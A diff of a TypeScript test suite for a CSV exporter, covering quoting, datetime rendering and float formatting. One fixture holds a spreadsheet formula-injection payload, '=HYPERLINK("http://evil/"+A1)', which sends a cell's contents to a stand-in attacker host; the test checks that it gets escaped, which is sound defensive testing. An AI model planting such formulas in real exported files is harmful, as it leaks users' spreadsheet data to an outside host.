@@ -92,19 +92,23 @@ describe("the shared golden document — same bytes as the server writer", () =>
     // The literal is asserted twice, in two languages, over the same values.
     // Python builds it with csv_text([header] + [[csv_cell(v) …]]); this side
     // with buildCsv(). If one writer drifts, that suite goes red and names it.
+    // `when` is doubled on purpose — one row an aware datetime, one row the same
+    // instant as the TEXT a browser actually receives — because a cell that is
+    // text on both sides cannot test the server's datetime rendering at all
+    // (that blind spot is divergence #2 in docs/csv-export.md §2).
     const header = ["id", "name", "notes", "active", "total", "when", "weight"];
     const rows = [
-      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00", 1.0],
+      [1, "Widget", "plain", true, "19.99", "2026-10-20T21:00:00Z", 1.0],
       [2, "Gizmo, big", 'say "hi"', false, "-5.00", null, -0.5],
       [3, "line1\nline2", '=HYPERLINK("http://evil/"+A1)', true, "-7.25",
-       "2026-10-20T21:00:00", 1e-7],
+       "2026-10-20T21:00:00Z", 1e-7],
     ];
     expect(buildCsv(header, rows)).toBe(
       "id,name,notes,active,total,when,weight\r\n" +
-      "1,Widget,plain,true,19.99,2026-10-20T21:00:00,1\r\n" +
+      "1,Widget,plain,true,19.99,2026-10-20T21:00:00Z,1\r\n" +
       '2,"Gizmo, big","say ""hi""",false,-5.00,,-0.5\r\n' +
       "3,\"line1\nline2\",\"'=HYPERLINK(\"\"http://evil/\"\"+A1)\"," +
-      "true,-7.25,2026-10-20T21:00:00,1e-7\r\n",
+      "true,-7.25,2026-10-20T21:00:00Z,1e-7\r\n",
     );
   });
 });
@@ -150,6 +154,22 @@ describe("csvCell — floats are the browser's own rendering", () => {
     expect(csvCell(-1e-9)).toBe("-1e-9");
     expect(csvCell(-2.0)).toBe("-2");
     expect(csvCell("-1e-9")).toBe("'-1e-9"); // the same characters AS text do guard
+  });
+
+  it("writes a float exactly as it arrives off the JSON body", () => {
+    // Client-side mirror of the server's TestFloatOverTheWire, over the same
+    // switch points the demo rig seeds (shop/management/commands/seed_demo.py):
+    // DRF sends a FloatField as a JSON NUMBER, so layer 1's cell is String() of
+    // a parsed value — never a re-format of the wire text. Values are written
+    // here in JSON's own spelling on purpose: the parse is the premise.
+    const parsed = (literal: string) => JSON.parse(`{"w":${literal}}`).w as number;
+    expect(parsed("1.0")).toBe(1);
+    expect(csvCell(parsed("1.0"))).toBe("1");
+    expect(csvCell(parsed("19.99"))).toBe("19.99");
+    expect(csvCell(parsed("1e-7"))).toBe("1e-7");
+    expect(csvCell(parsed("1e17"))).toBe("100000000000000000"); // Python: "1e+17"
+    expect(csvCell(parsed("-0.00042"))).toBe("-0.00042");
+    expect(csvCell(parsed("null"))).toBe(""); // NULL weight -> empty
   });
 });
 
